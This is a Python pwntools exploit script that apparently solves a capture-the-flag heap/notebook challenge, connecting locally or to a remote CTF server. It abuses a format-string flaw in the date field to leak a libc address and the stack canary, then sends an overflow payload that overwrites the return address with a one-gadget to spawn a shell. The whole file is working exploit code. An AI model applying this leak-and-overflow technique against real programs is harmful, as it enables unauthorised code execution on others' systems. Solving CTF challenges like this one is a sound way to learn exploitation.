#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./notebook")
context.arch = 'amd64'
#context.terminal = ['tmux','splitw','-h']
libc = ELF("./libc.so.6")
def start():
    if args.GDB:
        return gdb.debug(elf.path)
    if args.REMOTE:
        return remote("challs.dantectf.it", 31530)
    else:
        return process(elf.path)

def insert(pos, name, circle, data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Notebook position [1-5]: ", str(pos).encode())
    io.sendlineafter(b"Soul name: ", name)
    io.sendlineafter(b"Circle where I found him/her [1-9]: ", str(circle).encode())
    io.sendlineafter(b"When I met him/her [dd/Mon/YYYY]: ", data)

def remove(pos):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Notebook position [1-5]: ", str(pos).encode())

def edit(pos, name, circle, data):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Notebook position [1-5]: ", str(pos).encode())
    io.sendlineafter(b"Soul name: ", name)
    io.sendlineafter(b"Circle where I found him/her [1-9]: ", str(circle).encode())
    io.sendlineafter(b"When I met him/her [dd/Mon/YYYY]: ", data)    

def view(pos):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"Notebook position [1-5]: ", str(pos).encode()) 

def exit():
    io.sendlineafter(b"> ", b"5")

# libc leak 3 1133111
# stack address 6
# pie leak !?

io = start()

insert(1, 31*b"A", 1, b"../.../%3$p")
view(1)

# libc leak 
io.recvuntil(b".../")
libc_leak = int(io.recvline().strip(), 16)
libc.address = libc_leak - 1133111
info(f"Libc base @ {hex(libc.address)}")

ogg = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]

insert(2, 31*b"A", 2, b"11/111/%9$p")
view(2)

# leak stack cookie 
io.recvuntil(b"Meeting date: 11/111/")
cookie = int(io.recvline().strip(), 16)
info(f"Stack cookie {hex(cookie)}")

# bof !?
insert(3, 31*b"A", 9, b"../.../....\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAA"+p64(cookie)+p64(0)+p64(libc.address + ogg[0]))


io.interactive()

